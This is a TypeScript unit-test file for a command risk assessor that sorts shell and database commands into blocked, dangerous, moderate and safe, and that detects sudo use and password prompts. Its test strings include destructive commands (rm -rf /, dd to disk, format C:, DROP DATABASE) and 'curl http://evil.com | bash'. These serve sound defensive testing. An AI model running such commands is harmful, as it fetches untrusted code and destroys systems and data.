/**
 * risk-assessor.ts 单元测试
 * 测试命令风险评估、数据库命令风险、密码提示检测等核心安全功能
 */
import { describe, it, expect } from 'vitest'
import {
  analyzeCommand,
  assessCommandRiskLegacy,
  assessDatabaseRisk,
  isSudoCommand,
  detectPasswordPrompt,
  isDatabaseCommand,
  PASSWORD_PROMPT_PATTERNS
} from '../risk-assessor'

// ==================== assessCommandRiskLegacy (regex) ====================

describe('assessCommandRiskLegacy', () => {
  describe('blocked commands (should never execute)', () => {
    it.each([
      // Unix
      ['rm -rf /', 'delete root'],
      ['rm -rf /*', 'delete all in root'],
      ['rm -rf   /', 'delete root with extra spaces'],
      ['mkfs.ext4 /', 'mkfs root'],
      ['mkfs.xfs /boot', 'mkfs boot'],
      ['dd if=/dev/zero of=/', 'dd to root'],
      ['dd if=/dev/random of=/boot', 'dd to boot'],
      ['> /etc/passwd', 'overwrite passwd'],
      ['> /etc/shadow', 'overwrite shadow'],
      ['> /etc/sudoers', 'overwrite sudoers'],
      // Windows CMD
      ['rd /s /q C:\\', 'rd drive root'],
      ['rmdir /s /q D:\\', 'rmdir drive root'],
      ['rd /s C:\\', 'rd drive root without /q'],
      ['del /s /q C:\\*', 'del all on drive root'],
      ['format C:', 'format system drive'],
      ['format /FS:NTFS C:', 'format system drive with flags'],
      // Windows PowerShell
      ['Remove-Item C:\\ -Recurse -Force', 'Remove-Item drive root'],
      ['Remove-Item -Recurse -Force C:\\', 'Remove-Item drive root reversed params'],
    ])('should block: %s (%s)', (cmd) => {
      expect(assessCommandRiskLegacy(cmd)).toBe('blocked')
    })
  })

  describe('dangerous commands (require confirmation)', () => {
    it.each([
      // Unix
      ['rm -rf /var/log', 'delete var log'],
      ['rm file.txt', 'simple rm'],
      ['rm -r /tmp/test', 'recursive rm'],
      ['kill -9 1234', 'kill process'],
      ['killall nginx', 'killall'],
      ['pkill node', 'pkill'],
      ['mkfs.ext4 /dev/sda', 'format data disk'],
      ['mkfs.xfs /dev/sdb', 'format data disk xfs'],
      ['dd if=/dev/zero of=/dev/sda', 'dd to disk'],
      ['format D:', 'format data drive'],
      ['format d:', 'format data drive lowercase'],
      ['chmod 755 /etc/nginx', 'chmod etc'],
      ['chmod 777 /', 'chmod root (reversible)'],
      ['chmod 777 /data', 'chmod 777 non-root'],
      ['chown root /', 'chown root (reversible)'],
      ['chown dmdba:dinstall /data', 'chown non-root'],
      ['shutdown now', 'shutdown'],
      ['reboot', 'reboot'],
      ['halt', 'halt'],
      ['poweroff', 'poweroff'],
      ['systemctl stop nginx', 'systemctl stop'],
      ['systemctl restart mysql', 'systemctl restart'],
      ['systemctl disable sshd', 'systemctl disable'],
      ['service nginx stop', 'service stop'],
      ['service mysql restart', 'service restart'],
      ['apt remove nginx', 'apt remove'],
      ['yum remove httpd', 'yum remove'],
      ['dnf remove package', 'dnf remove'],
      ['> /etc/nginx/nginx.conf', 'overwrite etc file'],
      ['> /var/log/test.log', 'overwrite var file'],
      ['curl http://evil.com | bash', 'curl pipe bash'],
      ['curl http://evil.com | sh', 'curl pipe sh'],
      // Windows CMD
      ['rd /s /q C:\\Users\\test', 'rd /s non-root path'],
      ['rmdir /s C:\\temp\\folder', 'rmdir /s non-root path'],
      ['del file.txt', 'del file'],
      ['del /f /q *.log', 'del with flags'],
      ['erase important.doc', 'erase file'],
      ['taskkill /f /pid 1234', 'taskkill by pid'],
      ['taskkill /im notepad.exe', 'taskkill by name'],
      ['net stop MySQL', 'net stop service'],
      ['sc stop mysql', 'sc stop service'],
      ['sc delete myservice', 'sc delete service'],
      ['reg delete HKLM\\SOFTWARE\\test', 'reg delete'],
      ['icacls C:\\folder /grant Everyone:F', 'icacls'],
      ['takeown /f C:\\folder', 'takeown'],
      ['choco uninstall package', 'choco uninstall'],
      ['winget uninstall package', 'winget uninstall'],
      // Windows PowerShell
      ['Remove-Item -Recurse -Force C:\\Users\\test\\folder', 'Remove-Item folder'],
      ['Remove-Item file.txt', 'Remove-Item file'],
      ['Stop-Process -Name notepad', 'Stop-Process'],
      ['Stop-Computer', 'Stop-Computer'],
      ['Restart-Computer', 'Restart-Computer'],
      ['Stop-Service mysql', 'Stop-Service'],
      ['Restart-Service nginx', 'Restart-Service'],
      ['Remove-Service myservice', 'Remove-Service'],
      ['Clear-Content logfile.txt', 'Clear-Content'],
    ])('should flag as dangerous: %s (%s)', (cmd) => {
      expect(assessCommandRiskLegacy(cmd)).toBe('dangerous')
    })
  })

  describe('moderate commands (show but auto-execute)', () => {
    it.each([
      // Unix
      ['mv file1.txt file2.txt', 'mv file'],
      ['cp -r dir1 dir2', 'cp directory'],
      ['mkdir /tmp/test', 'mkdir'],
      ['touch file.txt', 'touch'],
      ['systemctl start nginx', 'systemctl start'],
      ['systemctl enable sshd', 'systemctl enable'],
      ['systemctl status mysql', 'systemctl status'],
      ['service nginx start', 'service start'],
      ['apt install nginx', 'apt install'],
      ['yum install httpd', 'yum install'],
      ['dnf install package', 'dnf install'],
      ['npm install express', 'npm install'],
      ['pip install flask', 'pip install'],
      ['git pull', 'git pull'],
      ['git push', 'git push'],
      ['git commit -m "test"', 'git commit'],
      ['echo "test" > file.txt', 'redirect to file'],
      // Windows CMD
      ['move file1.txt file2.txt', 'move file'],
      ['copy file1.txt file2.txt', 'copy file'],
      ['xcopy /s dir1 dir2', 'xcopy'],
      ['robocopy dir1 dir2', 'robocopy'],
      ['ren file1.txt file2.txt', 'ren'],
      ['md newfolder', 'md'],
      ['net start MySQL', 'net start service'],
      ['sc start mysql', 'sc start service'],
      ['reg add HKLM\\SOFTWARE\\test /v key /d value', 'reg add'],
      ['choco install nodejs', 'choco install'],
      ['winget install Git.Git', 'winget install'],
      // Windows PowerShell
      ['Move-Item file1.txt file2.txt', 'Move-Item'],
      ['Copy-Item file1.txt file2.txt', 'Copy-Item'],
      ['New-Item -Type Directory newfolder', 'New-Item'],
      ['Rename-Item old.txt new.txt', 'Rename-Item'],
      ['Start-Service mysql', 'Start-Service'],
      ['Install-Module PSReadLine', 'Install-Module'],
      ['Install-Package nuget', 'Install-Package'],
    ])('should flag as moderate: %s (%s)', (cmd) => {
      expect(assessCommandRiskLegacy(cmd)).toBe('moderate')
    })
  })

  describe('safe commands (auto-execute)', () => {
    it.each([
      // Unix
      ['ls', 'list'],
      ['ls -la', 'list all'],
      ['ls -la /tmp', 'list directory'],
      ['pwd', 'print working directory'],
      ['whoami', 'whoami'],
      ['cat /etc/hosts', 'cat file'],
      ['head -n 10 file.txt', 'head'],
      ['tail -n 10 file.txt', 'tail'],
      ['grep pattern file.txt', 'grep'],
      ['find . -name "*.js"', 'find'],
      ['echo hello', 'echo'],
      ['date', 'date'],
      ['uptime', 'uptime'],
      ['df -h', 'df'],
      ['du -sh /tmp', 'du'],
      ['free -m', 'free'],
      ['ps aux', 'ps'],
      ['top -bn1', 'top batch'],
      ['netstat -tlnp', 'netstat'],
      ['ss -tlnp', 'ss'],
      ['ip addr', 'ip addr'],
      ['ifconfig', 'ifconfig'],
      ['ping -c 4 google.com', 'ping with count'],
      ['curl -I http://example.com', 'curl head'],
      ['wget --spider http://example.com', 'wget spider'],
      // Windows
      ['dir', 'dir'],
      ['dir /s', 'dir recursive'],
      ['type file.txt', 'type file'],
      ['hostname', 'hostname'],
      ['ipconfig', 'ipconfig'],
      ['ipconfig /all', 'ipconfig all'],
      ['systeminfo', 'systeminfo'],
      ['whoami', 'whoami windows'],
      ['Get-Process', 'Get-Process'],
      ['Get-Service', 'Get-Service'],
      ['Get-ChildItem', 'Get-ChildItem'],
      ['Get-Content file.txt', 'Get-Content'],
      ['Test-Connection -Count 4 google.com', 'Test-Connection'],
    ])('should allow safe command: %s (%s)', (cmd) => {
      expect(assessCommandRiskLegacy(cmd)).toBe('safe')
    })
  })

  describe('Windows: blocked vs dangerous boundary', () => {
    it('rd /s on drive root should be blocked', () => {
      expect(assessCommandRiskLegacy('rd /s /q C:\\')).toBe('blocked')
    })

    it('rd /s on non-root path should be dangerous (not blocked)', () => {
      expect(assessCommandRiskLegacy('rd /s /q C:\\Users\\test')).toBe('dangerous')
    })

    it('rd without /s should be safe (empty dir only)', () => {
      expect(assessCommandRiskLegacy('rd emptydir')).toBe('safe')
    })

    it('Remove-Item with -Recurse on drive root should be blocked', () => {
      expect(assessCommandRiskLegacy('Remove-Item C:\\ -Recurse -Force')).toBe('blocked')
    })

    it('Remove-Item with -Recurse on non-root should be dangerous', () => {
      expect(assessCommandRiskLegacy('Remove-Item C:\\temp -Recurse')).toBe('dangerous')
    })
  })
})

// ==================== analyzeCommand ====================

describe('analyzeCommand', () => {
  describe('blocked interactive commands', () => {
    it.each([
      ['vim /etc/hosts', 'vim'],
      ['vi file.txt', 'vi'],
      ['nvim config.js', 'nvim'],
      ['nano /etc/nginx.conf', 'nano'],
      ['emacs file.el', 'emacs'],
      ['mc', 'midnight commander'],
      ['ranger', 'ranger'],
      ['tmux', 'tmux'],
      ['screen', 'screen'],
    ])('should block interactive command: %s (%s)', (cmd, _desc) => {
      const result = analyzeCommand(cmd)
      expect(result.strategy).toBe('block')
      expect(result.hint).toBeDefined()
    })
  })

  describe('auto-fix commands', () => {
    it('should auto-fix apt install without -y', () => {
      const result = analyzeCommand('apt install nginx')
      expect(result.strategy).toBe('auto_fix')
      expect(result.fixedCommand).toContain('-y')
      expect(result.fixedCommand).toBe('apt install -y nginx')
    })

    it('should auto-fix apt-get install without -y', () => {
      const result = analyzeCommand('apt-get install curl')
      expect(result.strategy).toBe('auto_fix')
      expect(result.fixedCommand).toContain('-y')
    })

    it('should auto-fix yum install without -y', () => {
      const result = analyzeCommand('yum install httpd')
      expect(result.strategy).toBe('auto_fix')
      expect(result.fixedCommand).toContain('-y')
    })

    it('should auto-fix dnf install without -y', () => {
      const result = analyzeCommand('dnf install package')
      expect(result.strategy).toBe('auto_fix')
      expect(result.fixedCommand).toContain('-y')
    })

    it('should not modify apt install with -y', () => {
      const result = analyzeCommand('apt install -y nginx')
      expect(result.strategy).toBe('allow')
    })

    it('should not modify apt install with --yes', () => {
      const result = analyzeCommand('apt install --yes nginx')
      expect(result.strategy).toBe('allow')
    })
  })

  describe('fire_and_forget commands (continuous output)', () => {
    it('should detect tail -f', () => {
      const result = analyzeCommand('tail -f /var/log/syslog')
      expect(result.strategy).toBe('fire_and_forget')
    })

    it('should detect tail --follow', () => {
      const result = analyzeCommand('tail --follow /var/log/messages')
      expect(result.strategy).toBe('fire_and_forget')
    })

    it('should detect tail with combined flags', () => {
      const result = analyzeCommand('tail -nf 100 /var/log/syslog')
      expect(result.strategy).toBe('fire_and_forget')
    })

    it('should detect ping without -c', () => {
      const result = analyzeCommand('ping google.com')
      expect(result.strategy).toBe('fire_and_forget')
    })

    it('should allow ping with -c', () => {
      const result = analyzeCommand('ping -c 4 google.com')
      expect(result.strategy).toBe('allow')
    })

    it('should allow ping with -n (Windows count flag)', () => {
      const result = analyzeCommand('ping -n 10 google.com')
      expect(result.strategy).toBe('allow')
    })

    it('should detect PowerShell Get-Content -Wait', () => {
      const result = analyzeCommand('Get-Content -Wait C:\\logs\\app.log')
      expect(result.strategy).toBe('fire_and_forget')
    })

    it('should detect Get-Content with -Tail and -Wait', () => {
      const result = analyzeCommand('Get-Content -Tail 50 -Wait C:\\logs\\app.log')
      expect(result.strategy).toBe('fire_and_forget')
    })

    it('should detect watch command', () => {
      const result = analyzeCommand('watch -n 1 df -h')
      expect(result.strategy).toBe('fire_and_forget')
    })

    it.each([
      ['top', 'top'],
      ['htop', 'htop'],
      ['btop', 'btop'],
      ['atop', 'atop'],
      ['iotop', 'iotop'],
      ['iftop', 'iftop'],
      ['nload', 'nload'],
      ['bmon', 'bmon'],
    ])('should detect monitoring tool: %s', (cmd) => {
      const result = analyzeCommand(cmd)
      expect(result.strategy).toBe('fire_and_forget')
    })

    it('should detect journalctl -f', () => {
      const result = analyzeCommand('journalctl -f')
      expect(result.strategy).toBe('fire_and_forget')
    })

    it('should detect dmesg -w', () => {
      const result = analyzeCommand('dmesg -w')
      expect(result.strategy).toBe('fire_and_forget')
    })
  })

  describe('allowed commands', () => {
    it('should allow normal ls command', () => {
      const result = analyzeCommand('ls -la')
      expect(result.strategy).toBe('allow')
    })

    it('should allow cat command', () => {
      const result = analyzeCommand('cat /etc/hosts')
      expect(result.strategy).toBe('allow')
    })
  })
})

// ==================== isSudoCommand ====================

describe('isSudoCommand', () => {
  it.each([
    ['sudo apt update', true],
    ['sudo rm -rf /tmp/test', true],
    ['echo test | sudo tee file', true],
    ['su -c "command"', true],
    ['su', true],
    ['su root', true],
    ['pkexec command', true],
    ['doas command', true],
    ['ls -la', false],
    ['cat /etc/hosts', false],
    ['echo sudo', false],
  ])('isSudoCommand("%s") should be %s', (cmd, expected) => {
    expect(isSudoCommand(cmd)).toBe(expected)
  })
})

// ==================== detectPasswordPrompt ====================

describe('detectPasswordPrompt', () => {
  it('should detect sudo password prompt', () => {
    const output = 'some output\n[sudo] password for user:'
    const result = detectPasswordPrompt(output)
    expect(result.detected).toBe(true)
    expect(result.prompt).toContain('password')
  })

  it('should detect simple password prompt', () => {
    const output = 'Password:'
    const result = detectPasswordPrompt(output)
    expect(result.detected).toBe(true)
  })

  it('should detect password for user prompt', () => {
    const output = "Password for admin:"
    const result = detectPasswordPrompt(output)
    expect(result.detected).toBe(true)
  })

  it('should detect user password prompt', () => {
    const output = "admin's password:"
    const result = detectPasswordPrompt(output)
    expect(result.detected).toBe(true)
  })

  it('should detect passphrase prompt', () => {
    const output = 'Enter passphrase for key:'
    const result = detectPasswordPrompt(output)
    expect(result.detected).toBe(true)
  })

  it('should detect Chinese password prompt', () => {
    const output = '请输入密码：'
    const result = detectPasswordPrompt(output)
    expect(result.detected).toBe(true)
  })

  it('should detect Chinese password prompt with colon', () => {
    const output = '密码:'
    const result = detectPasswordPrompt(output)
    expect(result.detected).toBe(true)
  })

  it('should not detect false positives', () => {
    const output = 'Password has been set successfully'
    const result = detectPasswordPrompt(output)
    expect(result.detected).toBe(false)
  })

  it('should only check last 5 lines', () => {
    const output = 'Password:\nline1\nline2\nline3\nline4\nline5\nline6'
    const result = detectPasswordPrompt(output)
    expect(result.detected).toBe(false)
  })
})

// ==================== isDatabaseCommand ====================

describe('isDatabaseCommand', () => {
  it.each([
    ['mysql -u root -p', true],
    ['mysql -e "SELECT * FROM users"', true],
    ['mysqladmin status', true],
    ['mysqldump database > backup.sql', true],
    ['psql -U postgres', true],
    ['pg_dump database', true],
    ['pg_restore backup.dump', true],
    ['dropdb testdb', true],
    ['createdb newdb', true],
    ['mongo', true],
    ['mongosh', true],
    ['mongodump', true],
    ['mongorestore dump/', true],
    ['redis-cli', true],
    ['sqlite3 database.db', true],
    ['echo "SELECT 1" | mysql', true],
    ['cat script.sql | psql', true],
    ['sudo mysql -e "SELECT 1"', true],
    ['ls -la', false],
    ['cat /etc/hosts', false],
  ])('isDatabaseCommand("%s") should be %s', (cmd, expected) => {
    expect(isDatabaseCommand(cmd)).toBe(expected)
  })
})

// ==================== assessDatabaseRisk ====================

describe('assessDatabaseRisk', () => {
  describe('blocked database commands', () => {
    it.each([
      ['DROP DATABASE production', 'drop database'],
    ])('should block: %s (%s)', (cmd) => {
      expect(assessDatabaseRisk(cmd)).toBe('blocked')
    })
  })

  describe('dangerous database commands', () => {
    it.each([
      ['DROP DATABASE IF EXISTS testdb', 'drop database if exists'],
      ['DROP TABLE users', 'drop table'],
      ['dropdb production', 'dropdb command'],
      ['TRUNCATE TABLE users', 'truncate table'],
      ['DELETE FROM users;', 'delete without where'],
      ['DELETE FROM users WHERE 1=1', 'delete where 1=1'],
      ['DELETE FROM users WHERE true', 'delete where true'],
      ['UPDATE users SET active=0;', 'update without where'],
      ['UPDATE users SET active=0 WHERE 1=1', 'update where 1=1'],
      ['ALTER TABLE users DROP COLUMN email', 'drop column'],
      ['GRANT ALL ON *.* TO user', 'grant all'],
      ['REVOKE SELECT ON db FROM user', 'revoke'],
      ['collection.drop()', 'mongo drop collection'],
      ['.remove({})', 'mongo remove all'],
      ['FLUSHDB', 'redis flushdb'],
      ['FLUSHALL', 'redis flushall'],
    ])('should flag as dangerous: %s (%s)', (cmd) => {
      expect(assessDatabaseRisk(cmd)).toBe('dangerous')
    })
  })

  describe('moderate database commands', () => {
    it.each([
      ['DELETE FROM users WHERE id=1', 'delete with where'],
      ['ALTER TABLE users ADD COLUMN phone VARCHAR(20)', 'add column'],
      ['CREATE TABLE users (id INT)', 'create table'],
      ['CREATE DATABASE newdb', 'create database'],
      ['createdb newdb', 'createdb command'],
      ['INSERT INTO users VALUES (1, "test")', 'insert'],
      ['GRANT SELECT ON db TO user', 'grant non-all'],
      ['mysqldump database', 'mysqldump'],
      ['pg_dump database', 'pg_dump'],
      ['mongodump', 'mongodump'],
      ['mongorestore dump/', 'mongorestore without drop'],
      ['pg_restore backup.dump', 'pg_restore'],
    ])('should flag as moderate: %s (%s)', (cmd) => {
      expect(assessDatabaseRisk(cmd)).toBe('moderate')
    })
  })

  describe('safe database commands', () => {
    it.each([
      ['SELECT * FROM users', 'simple select'],
      ['SELECT COUNT(*) FROM orders', 'count query'],
      ['SHOW TABLES', 'show tables'],
      ['DESCRIBE users', 'describe'],
      ['EXPLAIN SELECT * FROM users', 'explain'],
    ])('should allow: %s (%s)', (cmd) => {
      expect(assessDatabaseRisk(cmd)).toBe('safe')
    })
  })
})

// ==================== PASSWORD_PROMPT_PATTERNS ====================

describe('PASSWORD_PROMPT_PATTERNS', () => {
  it('should have multiple patterns defined', () => {
    expect(PASSWORD_PROMPT_PATTERNS.length).toBeGreaterThan(5)
  })

  it('should match various password prompts', () => {
    const prompts = [
      'password:',
      'Password for user:',
      '[sudo] password for admin:',
      "root's password:",
      'Enter passphrase:',
      'Enter password:',
      '密码:',
      '密码：',
    ]

    for (const prompt of prompts) {
      const matches = PASSWORD_PROMPT_PATTERNS.some(p => p.test(prompt))
      expect(matches).toBe(true)
    }
  })
})
